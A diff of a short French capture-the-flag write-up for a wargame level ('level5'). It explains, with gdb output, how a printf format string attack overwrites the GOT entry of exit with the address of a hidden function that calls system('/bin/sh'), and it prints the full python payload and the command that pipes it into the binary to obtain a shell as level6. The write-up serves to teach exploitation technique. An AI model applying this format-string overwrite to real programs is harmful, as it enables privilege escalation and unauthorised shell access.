@@ -1,3 +1,32 @@
-python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/exploit
+Comme les deux exercices précedent on veut faire une printf format string attack
 
-cat /tmp/exploit - | ./level5
+en utilisant gdb on remarque l'utilisation d'une fonction o qui n'est appelé nul part;
+on disassemble cette fonction et on remarque qu'il y a un call a system avec comme paramètre /bin/sh
+
+Donc on va devoir utiliser une format string pour appeler o
+
+Pour cela, on va juste remplacer l'adresse de la fonction exit (comme ça lorsque nous appeleront exit ça jumpera sur la fonction o à la place de exit):
+    ...
+    0x080484f3 <+49>:    call   0x8048380 <printf@plt>
+    0x080484f8 <+54>:    movl   $0x1,(%esp)
+    0x080484ff <+61>:    call   0x80483d0 <exit@plt>
+    ...
+
+Pour récupérer les adresses on peut donc faire:
+x/i 0x080484ff:
+    0x80483d0 <exit@plt>:        jmp    *0x8049838
+
+info function o
+    0x080484a4  o
+
+on a donc nos deux adresses
+exit=0x8049838
+o=0x080484a4
+
+On peut créer notre exploit:
+
+python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/exploit5
+cat /tmp/exploit5 - | ./level5
+
+whoami
+level6
